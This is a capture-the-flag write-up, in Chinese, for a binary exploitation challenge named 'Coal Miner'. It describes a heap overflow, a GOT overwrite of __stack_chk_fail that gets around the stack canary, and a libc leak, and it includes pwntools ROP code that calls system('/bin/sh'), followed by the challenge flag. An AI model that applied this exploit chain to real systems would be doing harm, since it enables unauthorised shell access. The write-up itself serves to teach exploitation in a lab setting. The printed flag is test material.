# Coal Miner

## 题目简述

菜单程序在添加物品时把超长描述写入固定大小区域，造成堆溢出。利用链需要先改写 GOT 获得稳定控制，再泄露 libc 地址，最后构造第二阶段 ROP 调用 `system("/bin/sh")`。

## 解题过程

程序启用了栈保护，直接覆盖受保护栈帧会触发 `__stack_chk_fail`。第一步利用堆溢出把 `__stack_chk_fail@GOT` 改成可返回或可继续利用的地址，从而使后续栈控制不因 canary 失败而终止。

第一阶段 ROP 调用 `puts(puts@GOT)`，然后返回主流程重新读入：

```python
from pwn import *

elf = ELF("./coalminer", checksec=False)
rop = ROP(elf)

stage1 = flat(
    b"A" * offset,
    rop.find_gadget(["pop rdi", "ret"]).address,
    elf.got["puts"],
    elf.plt["puts"],
    elf.symbols["main"],
)
```

读取泄露值后，以所用 libc 中 `puts` 的偏移计算基址：

```python
libc.address = leaked_puts - libc.symbols["puts"]
bin_sh = next(libc.search(b"/bin/sh\x00"))

stage2 = flat(
    b"A" * offset,
    rop.find_gadget(["ret"]).address,
    rop.find_gadget(["pop rdi", "ret"]).address,
    bin_sh,
    libc.symbols["system"],
)
```

第二阶段执行成功后读取 flag：

```text
UMDCTF-{i_hop3_you_like_c0al_pres3nts}
```

## 方法总结

本题的重点是把堆溢出、GOT 改写、libc 泄露和 ret2libc 串成完整链条。启用 canary 并不意味着无法利用：若攻击者能改写 `__stack_chk_fail` 的解析目标，保护机制本身也可能成为可控的跳板。
